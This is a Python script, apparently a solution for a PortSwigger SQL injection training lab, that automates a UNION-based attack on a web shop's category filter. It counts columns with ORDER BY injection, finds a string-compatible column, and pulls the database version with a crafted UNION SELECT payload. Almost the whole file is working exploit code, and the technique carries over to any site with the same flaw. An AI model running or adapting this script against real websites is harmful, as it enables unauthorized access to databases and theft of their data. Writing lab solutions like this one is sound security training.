import requests, urllib3, sys, argparse, time
from bs4 import BeautifulSoup
from banner import banner

# Disable SSL/TLS warnings to keep the terminal clean when using
# interception proxies like Burp Suite.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Optional Proxy Configuration:
# Uncomment PROXIES and add 'proxies=PROXIES' to requests.get to intercept
# traffic for further manual analysis.
# PROXIES = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def loading_effect(text, dots=3, delay=1):
    """Creates a visual loading animation in the terminal"""
    print(text, end='', flush=True)
    for _ in range(dots):
        time.sleep(delay)
        print('.', end='', flush=True)
    print()

def check_url(url):
    """Normalizes the target URL by removing trailing slashes"""
    if url[-1] == '/':
        url = url[:-1]
    return url

def check_columns(url):
    """
    Identifies the number of columns in the database table using ORDER BY.
    Increments the index until a 500 Internal Server Error is triggered.
    """
    loading_effect('[INFO] Determining the column count')

    for i in range(1, 6):
            # Using '+' for spaces and '%23' for the '#' comment character
            r = requests.get(url=url + f'/filter?category=test\'+ORDER+BY+{i}+%23', verify=False)  # , proxies=PROXIES
            if r.status_code == 500:
                num_columns = i - 1
                print(f'\n[+] The table has {num_columns} columns.\n')
                break
    return num_columns

def check_column_data_type(url, num_columns):
    """
    Finds a column compatible with string data by injecting 'a' into NULL positions.
    Once a column is found, it prepares the final payload to extract the database version.
    """
    loading_effect('[INFO] Evaluating the data type of each column')
    for i in range(num_columns):
        # Create a list of NULLs and replace the current index with a string test
        payload_list = ["NULL"] * num_columns
        payload_list[i] = '\'a\''

        # Format payload for URL (with +) and for display (with spaces)
        payload_url = ',+'.join(payload_list)
        payload = ', '.join(payload_list)

        print(f'\n[INFO] Trying payload: "UNION SELECT {payload} #"\n')
        r = requests.get(url=url + f'/filter?category=test\'+UNION+SELECT+{payload_url}+%23', verify=False)  # , proxies=PROXIES
        
        # If 200 OK, the column accepts string data
        if r.status_code == 200:
            # Swap 'a' for the database version command (MySQL/MariaDB syntax)
            payload_list[i] = '@@version'
            payload_url = ',+'.join(payload_list)
            final_payload = url + f'/filter?category=test\'+UNION+SELECT+{payload_url}+%23'
            print(f'[+] The column {i + 1} is injectable.\n')
            break
    return final_payload

def exploit(url):
    """Coordinates the full exploit chain: column count -> data type -> version extraction."""
    # Step 1: Reconnaissance
    num_columns = check_columns(url)

    # Step 2: Payload Generation
    final_payload = check_column_data_type(url, num_columns)

    # UI: Print decorative borders based on payload length
    long_payload = len(final_payload) + 30
    print('=' * long_payload)
    print(f'[INFO] Executing exploit at "{final_payload}"')
    print('=' * long_payload)

    # Step 3: Execution
    try:
        r = requests.get(url=final_payload, verify=False)  # , proxies=PROXIES
        r.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(f'\n[-] Network Error: The GET Request failed: {err}')
        sys.exit(1)

    # Step 4: Verification
    # Parse the DOM to find the specific table where results are rendered
    soup = BeautifulSoup(r.text, 'html.parser')
    table = soup.find('table', class_='is-table-longdescription')

    # Check for specific version strings indicating success
    if table is not None and '0ubuntu0' in table.text:
        print('\n\033[4;1;32m[+] SUCCESS! The exploit was successful, and the lab has been solved.\033[0m\n')
    else:
        print('\n\033[4;1;31m[-] Error: The exploit failed to retrieve the data.\033[0m\n')

def main(url):
    """Main entry point for the exploit script."""
    try:
        banner()
    except Exception:
        pass  # Skip if banner.py is missing or fails

    url = check_url(url)

    exploit(url)


if __name__ == "__main__":
    # Setup CLI argument parsing
    parser = argparse.ArgumentParser(description="Python exploit for PortSwigger\'s SQLi lab: Retriving data from MySQL or Microsft SQL Server databases.")

    parser.add_argument('-t', '--target', required=True,
                        help="Target Domain | Example: https://example.com")
    
    args = parser.parse_args()

    main(args.target)